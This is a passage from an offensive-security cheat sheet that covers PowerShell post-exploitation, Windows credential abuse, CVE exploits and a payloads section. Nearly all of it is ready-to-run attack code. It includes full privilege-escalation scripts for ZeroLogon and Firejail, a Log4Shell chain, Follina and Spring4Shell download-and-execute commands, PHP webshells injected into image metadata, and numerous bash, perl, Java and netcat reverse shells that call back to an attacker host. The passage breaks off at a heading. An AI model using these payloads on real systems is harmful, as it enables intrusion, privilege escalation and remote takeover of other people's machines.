powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
```

##### Import Module to PowerShell cmdlet

```c
Import-Module .\<FILE>
```

##### Check PowerShell Versions

```c
Set-ExecutionPolicy Unrestricted
powershell -Command "$PSVersionTable.PSVersion"
powershell -c "[Environment]::Is64BitProcess"
```

##### Read PowerShell History

```c
type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

##### Create a .zip File

```c
Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
```

##### Unzip a File

```c
Expand-Archive -Force <FILE>.zip
```

##### Start a new Process

```c
Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
```

##### Invoke-Expression / Invoke-WebRequest

```c
IEX(IWR http://<LHOST>/<FILE>.ps1)
Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
```

##### .NET Reflection

```c
$bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
```

##### Start offsec Session

```c
$offsec_session = New-PSSession -ComputerName <RHOST> -Authentication Negotiate -Credential <USERNAME>
Enter-PSSession $offsec_session
```

##### Execute Command as another User

```c
PS C:\> $SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
PS C:\> $Session = New-PSSession -Credential $Cred
PS C:\> Invoke-Command -Session $session -scriptblock { whoami }
```

or

```c
$username = '<USERNAME>'
$password = '<PASSWORD>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process powershell.exe -Credential $credential
```

```c
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```

##### Add new Domain Administrator

```c
$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
```

##### Execute Commands in User Context

```c
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
```

##### Execute Scripts with Credentials (Reverse Shell)

```c
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
```

#### pwncat

```c
(local) pwncat$ back    // get back to shell
Ctrl+d                  // get back to pwncat shell
```

```c
pwncat-cs -lp <LPORT>
(local) pwncat$ download /PATH/TO/FILE/<FILE> .
(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
```

#### rpcclient

```c
$ rpcclient -U "" <RHOST>
```

```c
srvinfo
netshareenum
netshareenumall
netsharegetinfo
netfileenum
netsessenum
netdiskenum
netconnenum
getanydcname
getdcname
dsr_getdcname
dsr_getdcnameex
dsr_getdcnameex2
dsr_getsitename
enumdomusers
enumdata
enumjobs
enumports
enumprivs
queryuser <USERNAME>
```

#### Rubeus

##### Overpass the Hash

```c
Rubeus.exe kerberoast /user:<USERNAME>
```

##### Pass the Hash

```c
.\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
```

#### RunasCs

```c
./RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
./RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
```

#### winexe

```c
winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
```

### CVE

#### CVE-2014-6271: Shellshock RCE PoC

```c
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
```

```c
shellshock='() { :;}; echo exploit' bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
<environment_variable>='() { :;}; echo exploit' bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
<environment_variable>='() { :;}; echo exploit' sudo /root/<binary>
```

#### CVE-2016-1531: exim LPE

- exim version <= 4.84-3

```c
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

#### CVE-2019-14287: Sudo Bypass

> https://www.exploit-db.com/exploits/47502

##### Prerequisites

- Sudo version < 1.8.28

##### Exploitation

```c
!root:
$ sudo -u#-1 /bin/bash
```

#### CVE-2020-1472: ZeroLogon PE

> https://github.com/SecuraBV/CVE-2020-1472

> https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py

##### Prerequisites

```c
python3 -m pip install virtualenv
python3 -m virtualenv venv
source venv/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
```

##### PoC Modification

```c
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
```

##### Weaponized PoC

```c
#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if not rpc_con:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
```

##### Execution

```c
python3 zerologon_tester.py <HANDLE> <RHOST>
secretsdump.py -just-dc -no-pass <HANDLE>\$@<RHOST>
```

#### CVE-2021-3156: Sudo / sudoedit LPE

> https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435

##### Pre-requisistes

- Ubuntu 20.04 (Sudo 1.8.31)
- Debian 10 (Sudo 1.8.27)
- Fedora 33 (Sudo 1.9.2)
- All legacy versions >= 1.8.2 to 1.8.31p2 and all stable versions >= 1.9.0 to 1.9.5p1

##### Vulnerability Test

```c
$ sudoedit -s /
```

The machine is vulnerable if one of the following message is shown.

```c
sudoedit: /: not a regular file
segfault
```

Not vulnerable if the error message starts with `usage:`.

#### CVE-2021-44228: Log4Shell RCE (0-day)

```c
cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
```

##### Preparation

> http://mirrors.rootpei.com/jdk/

File: jdk-8u181-linux-x64.tar.gz

##### Creating Library Folder

```c
sudo mkdir /usr/lib/jvm
cd /usr/lib/jvm
sudo tar xzvf /usr/lib/jvm/jdk-8u181-linux-x64.tar.gz
sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
```

##### Verify Version

```c
java -version
```

##### Get Exploit Framework

```c
git clone https://github.com/mbechler/marshalsec
cd /opt/08_exploitation_tools/marshalsec/
sudo apt-get install maven
mvn clean package -DskipTests
```

##### Exploit.java

```c
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <LHOST> <LPORT>");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

##### Compiling Exploit.java

```c
javac Exploit.java -source 8 -target 8
```

##### Start Pyhton3 HTTP Server

```c
python3 -m http.server 80
```

##### Starting the malicious LDAP Server

```c
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<LHOST>:80/#Exploit"
```

##### Start local netcat listener

```c
nc -lnvp 9001
```

##### Execute the Payload

```c
curl 'http://<RHOST>:8983/solr/admin/cores?foo=$\{jndi:ldap://<LHOST>:1389/Exploit\}'
```

#### CVE-2022-0847: Dirty Pipe LPE

```c
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 ootz:
su rootz
```

#### CVE-2022-22963: Spring4Shell RCE (0-day)

> https://github.com/me2nuk/CVE-2022-22963

```c
$ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
```

```c
$ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
```

#### CVE-2022-30190: MS-MSDT Follina RCE

> https://github.com/JohnHammond/msdt-follina

```c
python3 follina.py -p 80 -c 'powershell.exe Invoke-WebRequest http://<LHOST>:8000/nc64.exe -OutFile C:\\Windows\\Tasks\\nc64.exe; C:\\Windows\\Tasks\\nc64.exe -e cmd.exe <LHOST> <LPORT>'
```

```c
python3 -m http.server 8000
```

```c
nc -lnvp <LPORT>
```

```c
swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
```

#### CVE-2022-31214: Firejail LPE

> https://seclists.org/oss-sec/2022/q2/188

> https://www.openwall.com/lists/oss-security/2022/06/08/10

```c
#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner () suse com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper sandbox")
    else:
        raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at {join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```

#### First Terminal

```c
$ ./firejoin_py.bin
You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

#### Second Terminal

```c
$ firejail --join=193982
$ su
```

#### CVE-2023-21746: Windows NTLM EoP LocalPotato LPE

> https://github.com/decoder-it/LocalPotato

> https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc

Modify the following file and build the solution.

```c
StorSvc\RpcClient\RpcClient\storsvc_c.c
```

```c
#if defined(_M_AMD64)

//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022
```

Modify the following file and build the solution.

```c
StorSvc\SprintCSP\SprintCSP\main.c
```

```c
void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
```

First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.

```c
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
```

At least trigger `StorSvc` via `RpcClient.exe`.

```c
.\RpcClient.exe
```

#### CVE-2023-22809: Sudo Bypass

> https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466

##### Prerequisites

- Sudo version needs to be ≥ 1.8 and < 1.9.12p2.
- Limited Sudo access to at least one file on the system that requires root access.

##### Example

```c
test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd
```

##### Exploitation

```c
EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
```

```c
sudoedit /etc/motd
```

#### CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)

```c
PS C:\> Import-Module .\CVE-2023-23397.ps1
PS C:\> Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav" -meetingsubject "<SUBJECT>" -meetingbody "<TEXT>"
```

#### Juicy Potato LPE

> https://github.com/ohpe/juicy-potato

> http://ohpe.it/juicy-potato/CLSID

##### msfvenom and Metasploit Execution

```c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
```

```c
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
msf6 exploit(multi/handler) > set LPORT <LHOST>
msf6 exploit(multi/handler) > run
```

```c
.\exploit.exe
```

```c
[*] Sending stage (175174 bytes) to <RHOST>
[*] Meterpreter session 1 opened (<LHOST>:<LPORT> -> <RHOST>:51990) at 2021-01-31 12:36:26 +0100
```

#### MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE

> https://www.exploit-db.com/exploits/1518

```c
$ gcc -g -c raptor_udf2.c -fPIC
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```c
$ mysql -u root
```

```c
> use mysql;
> create table foo(line blob);
> insert into foo values(load_file('/PATH/TO/SHARED_OBJECT/raptor_udf2.so'));
> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
> create function do_system returns integer soname 'raptor_udf2.so';
> select do_system('chmod +s /bin/bash');
```

#### SharpEfsPotato LPE

> https://github.com/bugch3ck/SharpEfsPotato

```c
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

#### Shocker Container Escape

> https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c

##### Modifying Exploit

```c
        // get a FS reference from something mounted in from outside
        if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
                die("[-] open");

        if (find_handle(fd1, "/root/root.txt", &root_h, &h) <= 0)
                die("[-] Cannot find valid handle!");
```

##### Compiling

```c
gcc shocker.c -o shocker
cc -Wall -std=c99 -O2 shocker.c -static
```

### Payloads

#### Donut

```c
donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
```

#### Exiftool

##### PHP into JPG Injection

```c
exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' <FILE>.jpeg
exiftool "-comment<=back.php" back.png
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
```

#### GhostScript

```c
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

#### nishang

```c
cd path/to/nishang/Shells/
cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1

tail -3 Invoke-PowerShellTcp.ps1
}

Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>

powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
```

#### Reverse Shells

##### Bash Reverse Shell

```c
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
```

##### curl Reverse Shell

```c
curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '{"auth": {"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"|base64 -d|bash"}'
```

##### Groovy (Jenkins) Reverse Shell

```c
String host="<LHOST>";
int port=<LPORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

##### JAVA Reverse Shell

```c
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

###### shell.jar

```c
package <NAME>;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Main extends JavaPlugin {
   @Override
   public void onDisable() {
     super.onDisable();
   }

@Override
public void onEnable() {
  final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
  try {
   Files.write(Paths.get("/var/www/<RHOST>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
   } catch (IOException e) {
     e.printStackTrace();
   }

   super.onEnable();
  }
}
```

##### Lua Reverse Shell

```c
http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
```

##### Markdown Reverse Shell

```c
--';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
```

##### mkfifo Reverse Shell

```c
mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
```

##### Netcat Reverse Shell

```c
nc -e /bin/sh <LHOST> <LPORT>
```

##### Perl Reverse Shell

```c
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

##### PHP Reverse Shell

```c
